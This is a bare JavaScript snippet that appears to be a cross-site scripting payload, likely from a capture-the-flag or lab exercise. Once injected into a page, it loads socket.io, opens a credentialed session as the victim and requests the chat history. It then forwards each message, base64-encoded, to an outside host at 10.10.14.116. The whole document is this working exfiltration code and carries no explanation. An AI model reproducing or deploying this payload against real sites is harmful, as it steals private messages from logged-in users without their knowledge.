const socketio = document.createElement('script');
socketio.setAttribute('src', '/socket.io/socket.io.js');
document.head.appendChild(socketio);

const opt = {method:'GET', mode:'no-cors'}
socketio.addEventListener('load',() =>{

    
    fetch(`/user/api/chat`, opt);
    var socket = io('/',{withCredentials: true});

    socket.on('message', (my_message) => {

        fetch('http://10.10.14.116/?m='+btoa(my_message),opt);
  
    });

    socket.emit('client_message', 'history');

});

